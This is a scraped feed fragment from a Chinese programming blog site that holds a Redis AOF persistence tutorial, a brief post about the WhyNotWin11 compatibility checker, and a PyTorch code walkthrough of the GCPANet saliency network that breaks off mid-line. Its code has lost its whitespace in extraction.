      <description>首页编程日记开发工具嵌入式服务器运维【基础篇】AOF日志：宕机了，Redis如何避免数据丢失？news/2025/10/31 17:53:58/背景如果有人问你：“你会把 Redis 用在什么业务场景下？”我想你大概率会说：“我会把它当作缓存使用，因为它把后端数据库中的数据存储在内存中，然后直接从内存中读取数据，响应速度会非常快。”没错，这确实是 Redis 的一个普遍使用场景，但是，这里也有一个绝对不能忽略的问题：一旦服务器宕机，内存中的数据将全部丢失。我们很容易想到的一个解决方案是，从后端数据库恢复这些数据，但这种方式存在两个问题：一是，需要频繁访问数据库，会给数据库带来巨大的压力；二是，这些数据是从慢速数据库中读取出来的，性能肯定比不上从 Redis 中读取，导致使用这些数据的应用程序响应变慢。所以，对 Redis 来说，实现数据的持久化，避免从后端数据库中进行恢复，是至关重要的。目前，Redis 的持久化主要有两大机制，即 AOF（Append Only File）日志和 RDB 快照。AOF 日志是如何实现的？说到日志，我们比较熟悉的是数据库的写前日志（Write Ahead Log, WAL），也就是说，在实际写数据前，先把修改的数据记到日志文件中，以便故障时进行恢复。不过，AOF 日志正好相反，它是写后日志，“写后”的意思是 Redis 是先执行命令，把数据写入内存，然后才记录日志，如下图所示：那 AOF 为什么要先执行命令再记日志呢？要回答这个问题，我们要先知道 AOF 里记录了什么内容。传统数据库的日志，例如 redo log（重做日志），记录的是修改后的数据，而 AOF 里记录的是 Redis 收到的每一条命令，这些命令是以文本形式保存的。为了避免额外的检查开销，Redis 在向 AOF 里面记录日志的时候，并不会先去对这些命令进行语法检查。所以，如果先记日志再执行命令的话，日志中就有可能记录了错误的命令，Redis 在使用日志恢复数据时，就可能会出错。而写后日志这种方式，就是先让系统执行命令，只有命令能执行成功，才会被记录到日志中，否则，系统就会直接向客户端报错。所以，Redis 使用写后日志这一方式的一大好处是，可以避免出现记录错误命令的情况。除此之外，AOF 还有一个好处：它是在命令执行后才记录日志，所以不会阻塞当前的写操作。（当然这主要还是因为 Redis 和 MySQL 是完全两种不同的“数据库”）不过，AOF 也有两个潜在的风险。首先，如果刚执行完一个命令，还没有来得及记日志就宕机了，那么这个命令和相应的数据就有丢失的风险。如果此时 Redis 是用作缓存，还可以从后端数据库重新读入数据进行恢复，但是，如果 Redis 是直接用作数据库的话，此时，因为命令没有记入日志，所以就无法用日志进行恢复了。其次，AOF 虽然避免了对当前命令的阻塞，但可能会给下一个操作带来阻塞风险。这是因为，AOF 日志也是在主线程中执行的，如果在把日志文件写入磁盘时，磁盘写压力大，就会导致写盘很慢，进而导致后续的操作也无法执行了。仔细分析的话，你就会发现，这两个风险都是和 AOF 写回磁盘的时机相关的。这也就意味着，如果我们能够控制一个写命令执行完后 AOF 日志写回磁盘的时机，这两个风险就解除了。三种写回策略对于这个问题，AOF 机制给我们提供了三个选择，也就是 AOF 配置项 appendfsync 的三个可选值。Always，同步写回：每个写命令执行完，立马同步地将日志写回磁盘；Everysec，每秒写回：每个写命令执行完，只是先把日志写到 AOF 文件的内存缓冲区，每隔一秒把缓冲区中的内容写入磁盘；No，操作系统控制的写回：每个写命令执行完，只是先把日志写到 AOF 文件的内存缓冲区，由操作系统决定何时将缓冲区内容写回磁盘。针对避免主线程阻塞和减少数据丢失问题，这三种写回策略都无法做到两全其美：“同步写回”可以做到基本不丢数据，但是它在每一个写命令后都有一个慢速的落盘操作，不可避免地会影响主线程性能；虽然“操作系统控制的写回”在写完缓冲区后，就可以继续执行后续的命令，但是落盘的时机已经不在 Redis 手中了，只要 AOF 记录没有写回磁盘，一旦宕机对应的数据就丢失了；“每秒写回”采用一秒写回一次的频率，避免了“同步写回”的性能开销，虽然减少了对系统性能的影响，但是如果发生宕机，上一秒内未落盘的命令操作仍然会丢失。所以，这只能算是，在避免影响主线程性能和避免数据丢失两者间取了个折中。总结一下就是：想要获得高性能，就选择 No 策略；如果想要得到高可靠性保证，就选择 Always 策略；如果允许数据有一点丢失，又希望性能别受太大影响的话，那么就选择 Everysec 策略。但是，按照系统的性能需求选定了写回策略，并不是“高枕无忧”了。毕竟，AOF 是以文件的形式在记录接收到的所有写命令。随着接收的写命令越来越多，AOF 文件会越来越大。这也就意味着，我们一定要小心 AOF 文件过大带来的性能问题。这里的“性能问题”，主要在于以下三个方面：一是，文件系统本身对文件大小有限制，无法保存过大的文件；二是，如果文件太大，之后再往里面追加命令记录的话，效率也会变低；三是，如果发生宕机，AOF 中记录的命令要一个个被重新执行，用于故障恢复，如果日志文件太大，整个恢复过程就会非常缓慢，这就会影响到 Redis 的正常使用。日志文件太大了怎么办？所以，我们就要采取一定的控制手段，这个时候，AOF 重写机制就登场了。简单来说，AOF 重写机制就是在重写时，Redis 根据数据库的现状创建一个新的 AOF 文件，也就是说，读取数据库中的所有键值对，然后对每一个键值对用一条命令记录它的写入。主要就是因为重写机制具有“多变一”功能。所谓的“多变一”，也就是说，旧日志文件中的多条命令，在重写后的新日志中变成了一条命令。不过，虽然 AOF 重写后，日志文件会缩小，但是，要把整个数据库的最新数据的操作日志都写回磁盘，仍然是一个非常耗时的过程。这时，我们就要继续关注另一个问题了：重写会不会阻塞主线程？AOF 重写会阻塞吗?和 AOF 日志由主线程写回不同，重写过程是由后台子进程 bgrewriteaof 来完成的，这也是为了避免阻塞主线程，导致数据库性能下降。我把重写的过程总结为“一个拷贝，两处日志”。“一个拷贝”就是指，每次执行重写时，主线程 fork 出后台的 bgrewriteaof 子进程。此时，fork 会把主线程的内存拷贝一份给 bgrewriteaof 子进程（fork子进程时，子进程是会拷贝父进程的页表，即虚实映射关系，而不会拷贝物理内存。子进程复制了父进程页表，也能共享访问父进程的内存数据了，此时，类似于有了父进程的所有内存数据。），这里面就包含了数据库的最新数据。然后，bgrewriteaof 子进程就可以在不影响主线程的情况下，逐一把拷贝的数据写成操作，记入重写日志。因为主线程未阻塞，仍然可以处理新来的操作。此时，如果有写操作，第一处日志就是指正在使用的 AOF 日志，Redis 会把这个操作写到它的缓冲区。这样一来，即使宕机了，这个 AOF 日志的操作仍然是齐全的，可以用于恢复。而第二处日志，就是指新的 AOF 重写日志。这个操作也会被写到重写日志的缓冲区。这样，重写日志也不会丢失最新的操作。等到拷贝数据的所有操作记录重写完成后，重写日志记录的这些最新操作也会写入新的 AOF 文件，以保证数据库最新状态的记录。此时，我们就可以用新的 AOF 文件替代旧文件了。总结来说，每次 AOF 重写时，Redis 会先执行一个内存拷贝，用于重写；然后，使用两个日志保证在重写过程中，新写入的数据不会丢失。而且，因为 Redis 采用额外的线程进行数据重写，所以，这个过程并不会阻塞主线程。小结这节课，我们介绍了 Redis 用于避免数据丢失的 AOF 方法。这个方法通过逐一记录操作命令，在恢复时再逐一执行命令的方式，保证了数据的可靠性。这个方法看似“简单”，但也是充分考虑了对 Redis 性能的影响。总结来说，它提供了 AOF 日志的三种写回策略，分别是 Always、Everysec 和 No，这三种策略在可靠性上是从高到低，而在性能上则是从低到高。此外，为了避免日志文件过大，Redis 还提供了 AOF 重写机制，直接根据数据库里数据的最新状态，生成这些数据的插入命令，作为新日志。这个过程通过后台线程完成，避免了对主线程的阻塞。但是，在“用日志”的过程中，也就是使用 AOF 进行故障恢复时，我们仍然需要把所有的操作记录都运行一遍。再加上 Redis 的单线程设计，这些命令操作只能一条一条按顺序执行，这个“重放”的过程就会很慢了。那么，有没有既能避免数据丢失，又能更快地恢复的方法呢？当然有，那就是 RDB 快照了。每课一问AOF 日志重写的时候，是由 bgrewriteaof 子进程来完成的，不用主线程参与，我们今天说的非阻塞也是指子进程的执行不阻塞主线程。但是，你觉得，这个重写过程有没有其他潜在的阻塞风险呢？如果有的话，会在哪里阻塞？a. fork 子进程，fork这个瞬间一定是会阻塞主线程的，fork采用操作系统提供的写实复制(Copy On Write)机制，就是为了避免一次性拷贝大量内存数据给子进程造成的长时间阻塞问题，但fork子进程需要拷贝进程必要的数据结构，其中有一项就是拷贝内存页表（虚拟内存和物理内存的映射索引表），这个拷贝过程会消耗大量CPU资源，拷贝完成之前整个进程是会阻塞的，阻塞时间取决于整个实例的内存大小，实例越大，内存页表越大，fork阻塞时间越久。拷贝内存页表完成后，子进程与父进程指向相同的内存地址空间，也就是说此时虽然产生了子进程，但是并没有申请与父进程相同的内存大小。那什么时候父子进程才会真正内存分离呢？“写实复制”顾名思义，就是在写发生时，才真正拷贝内存真正的数据，这个过程中，父进程也可能会产生阻塞的风险。b. fork出的子进程指向与父进程相同的内存地址空间，此时子进程就可以执行AOF重写，把内存中的所有数据写入到AOF文件中。但是此时父进程依旧是会有流量写入的，如果父进程操作的是一个已经存在的key，那么这个时候父进程就会真正拷贝这个key对应的内存数据，申请新的内存空间，这样逐渐地，父子进程内存数据开始分离，父子进程逐渐拥有各自独立的内存空间。因为内存分配是以页为单位进行分配的，默认4k，如果父进程此时操作的是一个bigkey，重新申请大块内存耗时会变长，可能会产阻塞风险。AOF 重写也有一个重写日志，为什么它不共享使用 AOF 本身的日志呢？一个原因是父子进程写同一个文件必然会产生竞争问题，控制竞争就意味着会影响父进程的性能。二是如果AOF重写过程中失败了，那么原本的AOF文件相当于被污染了，无法做恢复使用。所以Redis AOF重写一个新文件，重写失败的话，直接删除这个文件就好了，不会对原先的AOF文件产生影响。等重写完成之后，直接替换旧文件即可。http://www.ppmy.cn/news/1540424.html相关文章你的电脑能不能安装windows 11，用这个软件检测下就知道了为了应对Windows 11的推出&amp;#xff0c;一款名为WhyNotWin11的创新型诊断软件应运而生。这个强大的工具不仅仅是一个简单的兼容性检测器&amp;#xff0c;它更像是一位细心的数字医生&amp;#xff0c;全方位评估您的计算机是否准备好迎接微软最新操作系统的挑战。 
WhyNotWin11的功能远超…阅读更多...代码复现（五）：GCPANet文章目录 net.py1.class Bottleneck&amp;#xff1a;残差块2.class ResNet&amp;#xff1a;特征提取3.class SRM&amp;#xff1a;SR模块4.class FAM&amp;#xff1a;FIA模块5.class CA&amp;#xff1a;GCF模块6.class SA&amp;#xff1a;HA模块7.class GCPANet&amp;#xff1a;网络架构 train.pytest.py 论文…阅读更多...基于SSM+微信小程序的实验室设备故障报修管理系统2&amp;#x1f449;文末查看项目功能视频演示获取源码sql脚本视频导入教程视频 
1、项目介绍 
基于SSM微信小程序的实验室设备故障报修管理系统2实现了管理员&amp;#xff0c;用户&amp;#xff0c;维修员三个角色。 
管理员功能有 个人中心&amp;#xff0c;用户管理&amp;#xff0c;维修员管理&amp;#…阅读更多...YOLO模型在不同光照条件下的检测性能如何优化？域自适应方法&amp;#xff1a;通过合并多个预训练模型&amp;#xff0c;并结合生成模型来适应新的可视化任务&amp;#xff0c;无需创建额外的数据集。例如&amp;#xff0c;YOLO-in-the-Dark模型就是将预先训练好的模型与生成模型相结合&amp;#xff0c;在不增加数据集的情况下&amp;#xff0c;通过粘合层…阅读更多...QT QML 练习1这个代码是使用 QtQuick 框架编写的一个简单的 GUI 应用程序&amp;#xff0c;创建了一个窗口&amp;#xff0c;其中包含了一个背景图像、一个风车杆&amp;#xff08;pole&amp;#xff09;&amp;#xff0c;以及一个可以点击旋转的风车&amp;#xff08;pinwheel&amp;#xff09;。以下是对实现的详细介绍及其特…阅读更多...微信小程序上传组件封装uploadHelper2.0使用整理一、uploadHelper2.0使用步骤说明 
uploadHelper.js ---上传代码封装库 
cos-wx-sdk-v5.min.js---腾讯云&amp;#xff0c;对象存储封装库 
第一步&amp;#xff0c;下载组件代码&amp;#xff0c;放置到自己的小程序项目中 第二步、 创建上传对象&amp;#xff0c;执行选择图片/视频 var _this  th…阅读更多...Python案例小练习——小计算器文章目录 前言一、代码展示二、运行展示 前言 
这是用python实现一个简单的计器。 一、代码展示 
def calculate(num1, op, num2):if op  "":return float(num1)  float(num2)elif op  "-":return float(num1) - float(num2)elif op  "*":return…阅读更多...linux查看系统类型要确定系统是 Ubuntu 还是 CentOS&amp;#xff0c;可以通过查看系统的发行版信息来判断。以下是几种常见的方法&amp;#xff1a; 
方法一&amp;#xff1a;使用 cat 命令查看 /etc/os-release 文件 
这个文件包含了系统的详细信息&amp;#xff0c;包括发行版名称和版本号。 
cat /etc/os-release…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:58 +0000</pubDate>
    </item>
    <item>
      <title>你的电脑能不能安装windows 11，用这个软件检测下就知道了</title>
      <link>https://www.ppmy.cn/news/1540423.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维你的电脑能不能安装windows 11，用这个软件检测下就知道了news/2025/10/31 17:53:57/为了应对Windows 11的推出，一款名为WhyNotWin11的创新型诊断软件应运而生。这个强大的工具不仅仅是一个简单的兼容性检测器，它更像是一位细心的数字医生，全方位评估您的计算机是否准备好迎接微软最新操作系统的挑战。WhyNotWin11的功能远超出普通的系统检查工具。它深入分析您设备的每个角落，从处理器的性能到显卡的规格，再到存储设备的类型和容量，无一遗漏。这款软件还会仔细审查您的系统配置，确保诸如UEFI固件、安全启动功能和可信平台模块（TPM）等关键设置都已正确配置，为升级铺平道路。https://pan.quark.cn/s/1e1ad1882369http://www.ppmy.cn/news/1540423.html相关文章代码复现（五）：GCPANet文章目录 net.py1.class Bottleneck&amp;#xff1a;残差块2.class ResNet&amp;#xff1a;特征提取3.class SRM&amp;#xff1a;SR模块4.class FAM&amp;#xff1a;FIA模块5.class CA&amp;#xff1a;GCF模块6.class SA&amp;#xff1a;HA模块7.class GCPANet&amp;#xff1a;网络架构 train.pytest.py 论文…阅读更多...基于SSM+微信小程序的实验室设备故障报修管理系统2&amp;#x1f449;文末查看项目功能视频演示获取源码sql脚本视频导入教程视频 
1、项目介绍 
基于SSM微信小程序的实验室设备故障报修管理系统2实现了管理员&amp;#xff0c;用户&amp;#xff0c;维修员三个角色。 
管理员功能有 个人中心&amp;#xff0c;用户管理&amp;#xff0c;维修员管理&amp;#…阅读更多...YOLO模型在不同光照条件下的检测性能如何优化？域自适应方法&amp;#xff1a;通过合并多个预训练模型&amp;#xff0c;并结合生成模型来适应新的可视化任务&amp;#xff0c;无需创建额外的数据集。例如&amp;#xff0c;YOLO-in-the-Dark模型就是将预先训练好的模型与生成模型相结合&amp;#xff0c;在不增加数据集的情况下&amp;#xff0c;通过粘合层…阅读更多...QT QML 练习1这个代码是使用 QtQuick 框架编写的一个简单的 GUI 应用程序&amp;#xff0c;创建了一个窗口&amp;#xff0c;其中包含了一个背景图像、一个风车杆&amp;#xff08;pole&amp;#xff09;&amp;#xff0c;以及一个可以点击旋转的风车&amp;#xff08;pinwheel&amp;#xff09;。以下是对实现的详细介绍及其特…阅读更多...微信小程序上传组件封装uploadHelper2.0使用整理一、uploadHelper2.0使用步骤说明 
uploadHelper.js ---上传代码封装库 
cos-wx-sdk-v5.min.js---腾讯云&amp;#xff0c;对象存储封装库 
第一步&amp;#xff0c;下载组件代码&amp;#xff0c;放置到自己的小程序项目中 第二步、 创建上传对象&amp;#xff0c;执行选择图片/视频 var _this  th…阅读更多...Python案例小练习——小计算器文章目录 前言一、代码展示二、运行展示 前言 
这是用python实现一个简单的计器。 一、代码展示 
def calculate(num1, op, num2):if op  "":return float(num1)  float(num2)elif op  "-":return float(num1) - float(num2)elif op  "*":return…阅读更多...linux查看系统类型要确定系统是 Ubuntu 还是 CentOS&amp;#xff0c;可以通过查看系统的发行版信息来判断。以下是几种常见的方法&amp;#xff1a; 
方法一&amp;#xff1a;使用 cat 命令查看 /etc/os-release 文件 
这个文件包含了系统的详细信息&amp;#xff0c;包括发行版名称和版本号。 
cat /etc/os-release…阅读更多...SQL Injection | SQL 注入概述关注这个漏洞的其他相关笔记&amp;#xff1a;SQL 注入漏洞 - 学习手册-CSDN博客 0x01&amp;#xff1a;SQL 注入漏洞介绍 
SQL 注入就是指 Web 应用程序对用户输入数据的合法性没有判断&amp;#xff0c;前端传入后端的参数是可控的&amp;#xff0c;并且参数会带入到数据库中执行&amp;#xff0c;导致…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:57 +0000</pubDate>
    </item>
    <item>
      <title>代码复现（五）：GCPANet</title>
      <link>https://www.ppmy.cn/news/1540422.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维代码复现（五）：GCPANetnews/2025/10/31 17:53:56/文章目录net.py1.class Bottleneck：残差块2.class ResNet：特征提取3.class SRM：SR模块4.class FAM：FIA模块5.class CA：GCF模块6.class SA：HA模块7.class GCPANet：网络架构train.pytest.py论文：Global Context-Aware Progressive Aggregation Network for Salient Object Detection论文链接：Global Context-Aware Progressive Aggregation Network for Salient Object Detection代码链接：Githubnet.py1.class Bottleneck：残差块class Bottleneck(nn.Module)用于实现残差块。classBottleneck(nn.Module):def__init__(self,inplanes,planes,stride=1,downsample=None,dilation=1):#inplanes:输入通道数;planes:输出通道数;stride:步幅;downsample:下采样层;dilation:膨胀系数super(Bottleneck,self).__init__()#1×1卷积self.conv1=nn.Conv2d(inplanes,planes,kernel_size=1,bias=False)self.bn1=nn.BatchNorm2d(planes)#3×3卷积self.conv2=nn.Conv2d(planes,planes,kernel_size=3,stride=stride,padding=(3*dilation-1)//2,bias=False,dilation=dilation)self.bn2=nn.BatchNorm2d(planes)#1×1卷积self.conv3=nn.Conv2d(planes,planes*4,kernel_size=1,bias=False)self.bn3=nn.BatchNorm2d(planes*4)#下采样(若步幅不为1或输入通道数与目标通道数不匹配,则进行下采样)self.downsample=downsampledefforward(self,x):residual=x#1×1卷积out=F.relu(self.bn1(self.conv1(x)),inplace=True)#3×3卷积out=F.relu(self.bn2(self.conv2(out)),inplace=True)#1×1卷积out=self.bn3(self.conv3(out))#若不能直接将x与特征残差连接,则需下采样ifself.downsampleisnotNone:residual=self.downsample(x)#残差连接returnF.relu(out+residual,inplace=True)2.class ResNet：特征提取GCPANet模型使用R e s N e t 50 ResNet50ResNet50作为特征提取器，R e s N e t 50 ResNet50ResNet50共包含四个B l o c k BlockBlock结构，每个B l o c k BlockBlock中分别有3、4、6、3个B o t t l e n e c k BottleneckBottleneck。整体结构如下：classResNet(nn.Module):def__init__(self):super(ResNet,self).__init__()#跟踪输入通道数self.inplanes=64#conv1:7×7大小、输入通道3(RGB图像)、输出通道64、步长2、填充3self.conv1=nn.Conv2d(3,64,kernel_size=7,stride=2,padding=3,bias=False)self.bn1=nn.BatchNorm2d(64)#第一个残差层,对应conv_2self.layer1=self.make_layer(64,3,stride=1,dilation=1)#第二个残差层,对应conv_3self.layer2=self.make_layer(128,4,stride=2,dilation=1)#第三个残差层,对应conv_4self.layer3=self.make_layer(256,6,stride=2,dilation=1)#第四个残差层,对应conv_5self.layer4=self.make_layer(512,3,stride=2,dilation=1)#权重初始化self.initialize()defmake_layer(self,planes,blocks,stride,dilation):downsample=None#若步幅不为1或输入通道数与目标通道数不匹配,则进行下采样ifstride!=1orself.inplanes!=planes*4:#使用1×1卷积和批量归一化进行下采样downsample=nn.Sequential(nn.Conv2d(self.inplanes,planes*4,kernel_size=1,stride=stride,bias=False),nn.BatchNorm2d(planes*4))#添加第一个残差块,使用Bottleneck结构(输入通道数、输出通道数、步长、下采样模块、膨胀系数)layers=[Bottleneck(self.inplanes,planes,stride,downsample,dilation=dilation)]#更新通道数,为原先四倍self.inplanes=planes*4#循环添加残差块for_inrange(1,blocks):layers.append(Bottleneck(self.inplanes,planes,dilation=dilation))returnnn.Sequential(*layers)defforward(self,x):#conv1,输出为112×112out1=F.relu(self.bn1(self.conv1(x)),inplace=True)#conv2_x,输出为56×56out1=F.max_pool2d(out1,kernel_size=3,stride=2,padding=1)out2=self.layer1(out1)#conv_3,输出为28×28out3=self.layer2(out2)#conv_4,输出为14×14out4=self.layer3(out3)#conv_5,输出为7×7out5=self.layer4(out4)returnout1,out2,out3,out4,out5definitialize(self):#加载预训练模型的权重,允许部分权重匹配(strict=False)self.load_state_dict(torch.load('resnet50-19c8e357.pth'),strict=False)3.class SRM：SR模块class SRM(nn.Module)实现自细化模块，用于将HA模块（一个）和FIA模块（三个）得到的特征图进一步细化和增强。""" Self Refinement Module """classSRM(nn.Module):def__init__(self,in_channel):super(SRM,self).__init__()self.conv1=nn.Conv2d(in_channel,256,kernel_size=3,stride=1,padding=1)self.bn1=nn.BatchNorm2d(256)self.conv2=nn.Conv2d(256,512,kernel_size=3,stride=1,padding=1)defforward(self,x):#先将输入特征压缩为256通道大小,再分别通过Batch Normalization、ReLU层out1=F.relu(self.bn1(self.conv1(x)),inplace=True)#经过卷积运算转为512通道out2=self.conv2(out1)#将前256通道作为权重,后256通道作为偏置0w,b=out2[:,:256,:,:],out2[:,256:,:,:]#加权结合out1、w、b,并应用ReLU激活函数得到输出returnF.relu(w*out1+b,inplace=True)definitialize(self):weight_init(self)4.class FAM：FIA模块class FAM(nn.Module)定义特征交织聚合模块，用于融合低级特征、高级特征、上下文特征，从而产生具有全局感知的区分性和综合性特征。""" Feature Interweaved Aggregation Module """classFAM(nn.Module):def__init__(self,in_channel_left,in_channel_down,in_channel_right):#接受左、下、右三个方向的输入通道数(对应低级特征、高级特征、全局特征)super(FAM,self).__init__()#对低级特征f_l进行卷积、归一化self.conv0=nn.Conv2d(in_channel_left,256,kernel_size=3,stride=1,padding=1)self.bn0=nn.BatchNorm2d(256)#对高级特征f_h进行卷积、归一化self.conv1=nn.Conv2d(in_channel_down,256,kernel_size=3,stride=1,padding=1)self.bn1=nn.BatchNorm2d(256)#对全局特征f_g进行卷积、归一化self.conv2=nn.Conv2d(in_channel_right,256,kernel_size=3,stride=1,padding=1)self.bn2=nn.BatchNorm2d(256)self.conv_d1=nn.Conv2d(256,256,kernel_size=3,stride=1,padding=1)self.conv_d2=nn.Conv2d(256,256,kernel_size=3,stride=1,padding=1)self.conv_l=nn.Conv2d(256,256,kernel_size=3,stride=1,padding=1)self.conv3=nn.Conv2d(256*3,256,kernel_size=3,stride=1,padding=1)self.bn3=nn.BatchNorm2d(256)defforward(self,left,down,right):#依次将低级特征f_l、高级特征f_h、全局特征f_g卷积、归一化、ReLU激活,并压缩到256通道left=F.relu(self.bn0(self.conv0(left)),inplace=True)down=F.relu(self.bn1(self.conv1(down)),inplace=True)right=F.relu(self.bn2(self.conv2(right)),inplace=True)#256#上采样高级特征图down_1=self.conv_d1(down)#对left特征图卷积,得到分割掩码w1w1=self.conv_l(left)#检查高级特征图和低级特征图的空间维度,不匹配则使用线性插值调整高级特征图的大小.将分割掩码w1与高级特征图相乘并使用ReLU激活函数,得到f_{hl}ifdown.size()[2:]!=left.size()[2:]:down_=F.interpolate(down,size=left.size()[2:],mode='bilinear')z1=F.relu(w1*down_,inplace=True)else:z1=F.relu(w1*down,inplace=True)#将上采样后的高级特征图调整至与低级特征图相同的维度ifdown_1.size()[2:]!=left.size()[2:]:down_1=F.interpolate(down_1,size=left.size()[2:],mode='bilinear')#将高级特征图与低级特征图相乘得到f_{lh}z2=F.relu(down_1*left,inplace=True)#上采样全局特征图down_2=self.conv_d2(right)ifdown_2.size()[2:]!=left.size()[2:]:down_2=F.interpolate(down_2,size=left.size()[2:],mode='bilinear')#将全局特征图与低级特征图相乘得到f_{gl}z3=F.relu(down_2*left,inplace=True)#将三个结果catout=torch.cat((z1,z2,z3),dim=1)#输入卷积层运算并返回returnF.relu(self.bn3(self.conv3(out)),inplace=True)definitialize(self):weight_init(self)5.class CA：GCF模块class CA(nn.Module)对应模块G C F GCFGCF，用于从R e s N e t 50 ResNet50ResNet50提取的特征中捕获全局上下文信息，并输入到每个阶段的FIA模块。计算公式如下：f t o p f_{top}ftop​：输入特征1。f g a p f_{gap}fgap​：输入特征2。classCA(nn.Module):def__init__(self,in_channel_left,in_channel_down):#in_channel_left:f_{top}通道数;in_channel_down:f_{gap}通道数super(CA,self).__init__()self.conv0=nn.Conv2d(in_channel_left,256,kernel_size=1,stride=1,padding=0)self.bn0=nn.BatchNorm2d(256)self.conv1=nn.Conv2d(in_channel_down,256,kernel_size=1,stride=1,padding=0)self.conv2=nn.Conv2d(256,256,kernel_size=1,stride=1,padding=0)defforward(self,left,down):#对f_{top}进行Conv+Batch Normlization+ReLUleft=F.relu(self.bn0(self.conv0(left)),inplace=True)#平均池化,减少空间维度(H、W下降)down=down.mean(dim=(2,3),keepdim=True)#卷积+激活down=F.relu(self.conv1(down),inplace=True)#将输出值归一化到0-1之间down=torch.sigmoid(self.conv2(down))returnleft*downdefinitialize(self):weight_init(self)6.class SA：HA模块编码器顶层特征通常对于显著性目标检测是多余的，HA模块可利用空间和通道注意力机制来学习更多选择性和代表性的特征。计算公式：代码中类SA仅获取F 1 F1F1，而F 1 F1F1与f ff的计算由GCF模块（对应类CA）实现。classSA(nn.Module):def__init__(self,in_channel_left,in_channel_down):super(SA,self).__init__()self.conv0=nn.Conv2d(in_channel_left,256,kernel_size=3,stride=1,padding=1)self.bn0=nn.BatchNorm2d(256)self.conv2=nn.Conv2d(in_channel_down,512,kernel_size=3,stride=1,padding=1)defforward(self,left,down):#left、down都是由ResNet提取的特征#与SR模块相同操作left=F.relu(self.bn0(self.conv0(left)),inplace=True)#256 channelsdown_1=self.conv2(down)#检查down_1的空间尺寸是否与left相同.如果不同,则使用双线性插值调整down_1的尺寸.ifdown_1.size()[2:]!=left.size()[2:]:down_1=F.interpolate(down_1,size=left.size()[2:],mode='bilinear')#与SR模块相同,分别获取权重w、bw,b=down_1[:,:256,:,:],down_1[:,256:,:,:]#得到F1returnF.relu(w*left+b,inplace=True)definitialize(self):weight_init(self)7.class GCPANet：网络架构class GCPANet(nn.Module)定义了GCPANet的模型架构。classGCPANet(nn.Module):def__init__(self,cfg):super(GCPANet,self).__init__()self.cfg=cfg#ResNet50:进行特征提取self.bkbone=ResNet()#GCF:初始化多个通道注意力模块(CA)、空间注意力模块(SA)用于特征加权self.ca45=CA(2048,2048)self.ca35=CA(2048,2048)self.ca25=CA(2048,2048)self.ca55=CA(256,2048)self.sa55=SA(2048,2048)#FIA:初始化特征交织聚合模块,用于处理不同层次的特征self.fam45=FAM(1024,256,256)self.fam34=FAM(512,256,256)self.fam23=FAM(256,256,256)#SR:初始化自细化模块,用于对特征进行处理和提升self.srm5=SRM(256)self.srm4=SRM(256)self.srm3=SRM(256)self.srm2=SRM(256)#四个卷积层,将特征图(256通道)映射为单通道输出self.linear5=nn.Conv2d(256,1,kernel_size=3,stride=1,padding=1)self.linear4=nn.Conv2d(256,1,kernel_size=3,stride=1,padding=1)self.linear3=nn.Conv2d(256,1,kernel_size=3,stride=1,padding=1)self.linear2=nn.Conv2d(256,1,kernel_size=3,stride=1,padding=1)#初始化权重self.initialize()defforward(self,x):#使用骨干网络ResNet提取多层次特征out1,out2,out3,out4,out5_=self.bkbone(x)# GCFout4_a=self.ca45(out5_,out5_)out3_a=self.ca35(out5_,out5_)out2_a=self.ca25(out5_,out5_)# HAout5_a=self.sa55(out5_,out5_)out5=self.ca55(out5_a,out5_)#FIA+SRout5=self.srm5(out5)out4=self.srm4(self.fam45(out4,out5,out4_a))out3=self.srm3(self.fam34(out3,out4,out3_a))out2=self.srm2(self.fam23(out2,out3,out2_a))#将四个阶段SR模块的输出线性插值,得到与原始图像有相同大小的特征图out5=F.interpolate(self.linear5(out5),size=x.size()[2:],mode='bilinear')out4=F.interpolate(self.linear4(out4),size=x.size()[2:],mode='bilinear')out3=F.interpolate(self.linear3(out3),size=x.size()[2:],mode='bilinear')out2=F.interpolate(self.linear2(out2),size=x.size()[2:],mode='bilinear')#返回四张特征图returnout2,out3,out4,out5definitialize(self):ifself.cfg.snapshot:try:self.load_state_dict(torch.load(self.cfg.snapshot))except:print("Warning: please check the snapshot 